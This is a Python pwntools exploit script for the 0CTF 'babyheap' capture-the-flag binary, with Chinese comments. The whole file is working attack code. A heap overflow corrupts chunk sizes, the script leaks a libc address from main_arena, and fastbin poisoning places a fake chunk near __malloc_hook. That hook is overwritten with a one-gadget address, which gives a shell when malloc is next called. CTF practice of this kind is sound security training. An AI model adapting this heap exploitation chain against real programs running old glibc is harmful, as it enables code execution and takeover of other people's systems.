# coding=utf-8
from pwn import *

# context.log_level = 'DEBUG'

# First establish the target process and libc file
target = process('./0ctfbabyheap', env={
	"LD_PRELOAD":"./libc-2.23.so",
#	"LD_LIBRARY_PATH": "./2.23-0ubuntu3_amd64",
	}) # The ld_preload is used to switch out the libc version we are using
# target = process('./0ctfbabyheap') # The ld_preload is used to switch out the libc version we are using
pid = target.pid
#gdb.attach(target)
elf = ELF('libc-2.23.so')
# pause()

def alloc(size):
	target.recvuntil(b"Command: ")
	target.sendline(b"1")
	target.recvuntil(b"Size: ")
	target.sendline(str(size).encode())

def fill(index, size, content):
	target.recvuntil(b"Command: ")
	target.sendline(b"2")
	target.recvuntil(b"Index: ")
	target.sendline(str(index).encode())
	target.recvuntil(b"Size: ")
	target.sendline(str(size).encode())
	target.recvuntil(b"Content: ")
	target.send(content)

def free(index):
	# target.recvuntil(b"Command: ")
	target.sendlineafter(b"Command: ", b"3")
	# target.recvuntil(b"Index: ")
	target.sendlineafter(b"Index: ", str(index).encode())

def dump(index):
	target.recvuntil(b"Command")
	target.sendline(b"4")
	target.recvuntil(b"Index: ")
	target.sendline(str(index).encode())
	target.recvuntil(b"Content: \n")
	content = target.recvline()
	return content

# Make the initial four allocations, and fill them with data
alloc(0x80)# Chunk 0
alloc(0x80)# Chunk 1
alloc(0x80)# Chunk 2
alloc(0x80)# Chunk 3
fill(0, 0x80, "0"*0x80)
fill(1, 0x80, "1"*0x80)
fill(2, 0x80, "2"*0x80)
fill(3, 0x80, "3"*0x80)
payload0 = b'a'*(0x80 + 8) + p64(0x120 + 1)
# payload0 = b'a'*(0x80)
fill(0, len(payload0), payload0)
free(1)
# target.recv()
# target.recv()
alloc(0x80) # Chunk 1
content2 = dump(2)
print(content2)
dbg=1

# Print the contents of chunk 0, and filter out the main_arena+88 infoleak, and calculate the offsets for everything else
leak = u64(content2[0:8])
libc = leak - 0x58 - 0x10 - elf.symbols['__malloc_hook']
system = libc + 0x4526a
malloc_hook = libc + elf.symbols['__malloc_hook']
free_hook = libc + elf.symbols['__free_hook']
fake_chunk_loc = malloc_hook - 0x23
log.info("Leak is:        " + hex(leak))
log.info("libc is:        " + hex(libc))
log.info("System is:      " + hex(system))
log.info("Malloc hook is: " + hex(malloc_hook))
log.info("Free hook is:   " + hex(free_hook))
log.info("Fake chunk location is:  " + hex(fake_chunk_loc))
dbg=1

alloc(0x80) # Chunk 4(和2是同一块内存，并且2 4都是程序中的有效块)
alloc(0x60) # Chunk 5
alloc(0x60) # Chunk 6
fill(4, 0x80, "4"*0x80)
fill(2, 0x40, "2"*0x40)
fill(5, 0x60, "5"*0x60)
fill(6, 0x60, "6"*0x60)
dump2 = dump(2)
print(dump2)
print(hexdump(dump2)) # 4和2是同一块内存，并且2 4都是程序中的有效块
# target.recv() # 在此处调试时接收字符串
dbg=1

context.log_level = 'DEBUG'

free(5) # 先释放，然后修改Chunk3来溢出填充
payload3 = b'b'*(0x80) + p64(0x70 + 1) + p64(0x70 + 1) + p64(fake_chunk_loc) + p64(0)
fill(3, len(payload3), payload3)
alloc(0x60) # Chunk5
alloc(0x60) # Chunk7, fakeChunk
# target.recv()
fill(7, 0x1b, b'z'*0x13 + p64(system))
dbg=1

# target.interactive() 
# # interactive后手动输入 1 回车 1 回车，或者alloc代为输入
alloc(0x10) # pwn!

dbg=1
target.interactive()
